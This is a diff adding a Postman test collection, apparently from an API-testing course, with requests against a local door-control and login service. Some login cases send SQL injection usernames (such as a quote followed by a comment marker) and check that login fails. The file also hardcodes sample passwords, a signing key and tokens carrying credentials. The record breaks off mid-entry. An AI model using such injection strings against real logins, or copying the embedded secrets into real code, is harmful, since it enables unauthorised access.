@@ -1,0 +1,2021 @@
+{
+	"info": {
+		"_postman_id": "759022ab-0b57-461c-a789-dfc436e59090",
+		"name": "nowcoder",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "2.1 case1：正常开门_script2.1",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=open",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "open"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "2.1 case2：正常关门_script2.1",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=close",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "close"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "2.2 case1：参数p不存在_script2.1",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "2.2 case2：参数p=push_script2.1",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=push",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "push"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "2.2 case3：check_type?p=1_script2.2-1",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://127.0.0.1:5000/check_type?p=1",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"check_type"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "1"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "2.2 case4：door1?p=1_script2.2-2",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door1?p=9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door1"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "2.2 case5：door1?p=8_script2.2-2",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door1?p=8",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door1"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "8"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "2.2 case6：door1?p=8.5_script2.2-2",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door1?p=8.5",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door1"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "8.5"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "2.2 case7：door1?p=中文_script2.2-2",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU4OTk4MzM4MSwiZXhwIjoxNTkwMDY5NzgxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImRjNDgzZTgwYTdhMGJkOWVmNzFkOGNmOTczNjczOTI0In0.ezIAFjrcB9wOSobQ6l9FfRyblIjVVZwh3FNS4zTC1_oKKhfZED1oOqBZO4bInBM3D2AXzVbc4CXW1tGT02X0cw",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door1?p=中文",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door1"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "中文"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "3.1 case1：权限验证有效用户_script3.1-1",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=open&username=Mr.null&password=a123456",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "open"
+						},
+						{
+							"key": "username",
+							"value": "Mr.null"
+						},
+						{
+							"key": "password",
+							"value": "a123456"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "3.1 case2：权限验证密码错误用户_script3.1-1",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=open&username=Mr.null&password=a12345",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "open"
+						},
+						{
+							"key": "username",
+							"value": "Mr.null"
+						},
+						{
+							"key": "password",
+							"value": "a12345"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "3.1 case3：有效用户返回token_script3.1-2",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"Mr.null\",\r\n\t\"password\": \"a123456\"\r\n}",
+					"options": {
+						"raw": {}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/login?username=Mr.null&password=a123456",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "Mr.null"
+						},
+						{
+							"key": "password",
+							"value": "a123456"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "3.1 case4：无效用户返回“非法用户”_script3.1-2",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"Mr.null1\",\r\n\t\"password\": \"a123456\"\r\n}",
+					"options": {
+						"raw": {}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/login?username=Mr.null&password=a123456",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "Mr.null"
+						},
+						{
+							"key": "password",
+							"value": "a123456"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "3.1 case5：不带token访问door接口_script3.1-2",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=open",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "open"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "3.1 case6：带token访问door接口_script3.1-2",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "eyJhbGciOiJIUzUxMiIsImlhdCI6MTU5MTAwMzM0MSwiZXhwIjoxNTkxMDg5NzQxfQ.eyJ1c2VybmFtZSI6Ik1yLm51bGwiLCJwYXNzd29yZCI6ImExMjM0NTYifQ.wNwh1G44SXBEW854jvejWpucam7WyCqHZqjq4XaByDK1rc-SBY7R0nFCLzYkqbdq2wqX2veixLaJzMDW9Co3pQ",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=open",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "open"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "3.2 case1：密码加密_script3.2-1",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "5e9185f6-1b8b-4ad6-9cc7-abc591665f07",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=open&username=Mr.null&password={{password}}",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "open"
+						},
+						{
+							"key": "username",
+							"value": "Mr.null"
+						},
+						{
+							"key": "password",
+							"value": "{{password}}"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "3.2 case2：验证签名成功_script3.2-2",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "5e9185f6-1b8b-4ad6-9cc7-abc591665f07",
+						"exec": [
+							"// 定义变量值",
+							"p = \"open\"",
+							"username = \"Mr.null\"",
+							"password = \"dc483e80a7a0bd9ef71d8cf973673924\"",
+							"",
+							"",
+							"//设置当前时间戳",
+							"postman.setGlobalVariable(\"time\",Math.round(new Date().getTime()));",
+							"time = postman.getGlobalVariable('time')",
+							"",
+							"//设置KEY_WORD为全局变量",
+							"postman.setGlobalVariable(\"Key\",\"a7a0bd9ef71d8cf9\")",
+							"KEY_WORD = postman.getGlobalVariable(\"Key\");",
+							"",
+							"",
+							"//字符串进行md5加密",
+							"var str = p+username+password+time+KEY_WORD;",
+							"var strmd5= CryptoJS.MD5(str).toString();",
+							"postman.setGlobalVariable(\"sign\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p={{p}}&username={{username}}&password={{password}}&time={{time}}&sign={{sign}}",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "{{p}}",
+							"description": "open"
+						},
+						{
+							"key": "username",
+							"value": "{{username}}",
+							"description": "Mr.null"
+						},
+						{
+							"key": "password",
+							"value": "{{password}}"
+						},
+						{
+							"key": "time",
+							"value": "{{time}}"
+						},
+						{
+							"key": "sign",
+							"value": "{{sign}}"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "4.1 case1：有效用户返回token并自动提取_script3.1-2",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "25a229f5-1ecd-4a83-ab33-878b9c78e5d7",
+						"exec": [
+							"//保存响应结果json\r",
+							"var jsonData = JSON.parse(responseBody);\r",
+							"//将响应结果中的token保存为全局变量nk_token  \r",
+							"//最新版本pm环境变量设置使用方法\r",
+							"pm.globals.set(\"nk_token\",jsonData.token);"
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"Mr.null\",\r\n\t\"password\": \"a123456\"\r\n}",
+					"options": {
+						"raw": {}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/login",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "Mr.null",
+							"disabled": true
+						},
+						{
+							"key": "password",
+							"value": "a123456",
+							"disabled": true
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "4.1 case2：带token变量访问door接口_script3.1-2",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "{{nk_token}}",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://127.0.0.1:5000/door?p=open",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"door"
+					],
+					"query": [
+						{
+							"key": "p",
+							"value": "open"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case1：用户名1、密码均正确_script5.1",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "ff8e139a-050a-4b20-985e-67fa83b503eb",
+						"exec": [
+							"pm.test(\"验证code值为4\", function () {\r",
+							"    var jsonData = pm.response.json();\r",
+							"    pm.expect(jsonData.code).to.eql(4);\r",
+							"});\r",
+							"\r",
+							"pm.test(\"验证msg值为登录成功\", function () {\r",
+							"    var jsonData = pm.response.json();\r",
+							"    pm.expect(jsonData.msg).to.eql(\"登录成功，欢迎您！\");\r",
+							"});\r",
+							"\r",
+							"pm.test(\"验证包含token\", function () {\r",
+							"    pm.expect(pm.response.text()).to.include(\"token\");\r",
+							"});\r",
+							"\r",
+							"//保存响应结果json\r",
+							"var jsonData = pm.response.json();\r",
+							"//获取token值并赋予全局变量nk_token\r",
+							"pm.globals.set(\"nk_token\",jsonData.token);"
+						],
+						"type": "text/javascript"
+					}
+				},
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "d07b6422-9bc1-4c59-b801-b35a5318bac9",
+						"exec": [
+							"// 定义password值\r",
+							"password = \"a1234567\"\r",
+							"\r",
+							"//字符串进行md5加密\r",
+							"var strmd5= CryptoJS.MD5(password).toString();\r",
+							"postman.setGlobalVariable(\"password\",strmd5)\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"admin\",\r\n\t\"password\": \"{{password}}\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/login",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case2：用户名1正确、密码错误",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "ff8e139a-050a-4b20-985e-67fa83b503eb",
+						"exec": [
+							"pm.test(\"验证code值为4\", function () {\r",
+							"    var jsonData = pm.response.json();\r",
+							"    pm.expect(jsonData.code).to.eql(4);\r",
+							"});\r",
+							"\r",
+							"pm.test(\"验证msg值为登录成功\", function () {\r",
+							"    var jsonData = pm.response.json();\r",
+							"    pm.expect(jsonData.msg).to.eql(\"登录成功，欢迎您！\");\r",
+							"});\r",
+							"\r",
+							"pm.test(\"验证包含token\", function () {\r",
+							"    pm.expect(pm.response.text()).to.include(\"token\");\r",
+							"});\r",
+							"\r",
+							"//保存响应结果json\r",
+							"var jsonData = pm.response.json();\r",
+							"//获取token值并赋予全局变量nk_token\r",
+							"pm.globals.set(\"nk_token\",jsonData.token);"
+						],
+						"type": "text/javascript"
+					}
+				},
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "d07b6422-9bc1-4c59-b801-b35a5318bac9",
+						"exec": [
+							"// 定义password值\r",
+							"password = \"a12345\"\r",
+							"\r",
+							"//字符串进行md5加密\r",
+							"var strmd5= CryptoJS.MD5(password).toString();\r",
+							"postman.setGlobalVariable(\"password\",strmd5)\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"admin\",\r\n\t\"password\": \"{{password}}\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/login",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case3：用户名错误、密码正确",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "ff8e139a-050a-4b20-985e-67fa83b503eb",
+						"exec": [
+							"pm.test(\"验证code值为4\", function () {\r",
+							"    var jsonData = pm.response.json();\r",
+							"    pm.expect(jsonData.code).to.eql(4);\r",
+							"});\r",
+							"\r",
+							"pm.test(\"验证msg值为登录成功\", function () {\r",
+							"    var jsonData = pm.response.json();\r",
+							"    pm.expect(jsonData.msg).to.eql(\"登录成功，欢迎您！\");\r",
+							"});\r",
+							"\r",
+							"pm.test(\"验证包含token\", function () {\r",
+							"    pm.expect(pm.response.text()).to.include(\"token\");\r",
+							"});\r",
+							"\r",
+							"//保存响应结果json\r",
+							"var jsonData = pm.response.json();\r",
+							"//获取token值并赋予全局变量nk_token\r",
+							"pm.globals.set(\"nk_token\",jsonData.token);"
+						],
+						"type": "text/javascript"
+					}
+				},
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "d07b6422-9bc1-4c59-b801-b35a5318bac9",
+						"exec": [
+							"// 定义password值\r",
+							"password = \"a1234567\"\r",
+							"\r",
+							"//字符串进行md5加密\r",
+							"var strmd5= CryptoJS.MD5(password).toString();\r",
+							"postman.setGlobalVariable(\"password\",strmd5)\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"admin1\",\r\n\t\"password\": \"{{password}}\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/login",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case4：用户名2正确、密码正确",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "cbe63694-6d97-40c1-b1d4-18b31bb24ca3",
+						"exec": [
+							"var jsonData = JSON.parse(responseBody);\r",
+							"tests[\"sql注入\"] = jsonData.msg != \"登录成功\";\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				},
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "04b45e84-6dca-460b-afa5-9936e133bc8c",
+						"exec": [
+							"// 定义password值\r",
+							"password = \"a123456\"\r",
+							"\r",
+							"//字符串进行md5加密\r",
+							"var strmd5= CryptoJS.MD5(password).toString();\r",
+							"postman.setGlobalVariable(\"password\",strmd5)\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"Mr.null\",\r\n\t\"password\": \"{{password}}\"\r\n}",
+					"options": {
+						"raw": {}
+					}
+				},
+				"url": {
+					"raw": "http://{{host}}:5000/login",
+					"protocol": "http",
+					"host": [
+						"{{host}}"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case5：用户名'#、密码任意",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "cbe63694-6d97-40c1-b1d4-18b31bb24ca3",
+						"exec": [
+							"var jsonData = JSON.parse(responseBody);\r",
+							"tests[\"sql注入\"] = jsonData.msg != \"登录成功\";\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				},
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "04b45e84-6dca-460b-afa5-9936e133bc8c",
+						"exec": [
+							"// 定义password值\r",
+							"password = \"a123456789\"\r",
+							"\r",
+							"//字符串进行md5加密\r",
+							"var strmd5= CryptoJS.MD5(password).toString();\r",
+							"postman.setGlobalVariable(\"password\",strmd5)\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"Mr.null'#\",\r\n\t\"password\": \"{{password}}\"\r\n}",
+					"options": {
+						"raw": {}
+					}
+				},
+				"url": {
+					"raw": "http://{{host}}:5000/login",
+					"protocol": "http",
+					"host": [
+						"{{host}}"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case5：用户名'-- 、密码任意",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "cbe63694-6d97-40c1-b1d4-18b31bb24ca3",
+						"exec": [
+							"var jsonData = JSON.parse(responseBody);\r",
+							"tests[\"sql注入\"] = jsonData.msg != \"登录成功\";\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				},
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "04b45e84-6dca-460b-afa5-9936e133bc8c",
+						"exec": [
+							"// 定义password值\r",
+							"password = \"a123456789\"\r",
+							"\r",
+							"//字符串进行md5加密\r",
+							"var strmd5= CryptoJS.MD5(password).toString();\r",
+							"postman.setGlobalVariable(\"password\",strmd5)\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"Mr.null'-- \",\r\n\t\"password\": \"1\"\r\n}",
+					"options": {
+						"raw": {}
+					}
+				},
+				"url": {
+					"raw": "http://{{host}}:5000/login",
+					"protocol": "http",
+					"host": [
+						"{{host}}"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case6：newsid为1，查询成功",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news?newsid=1",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
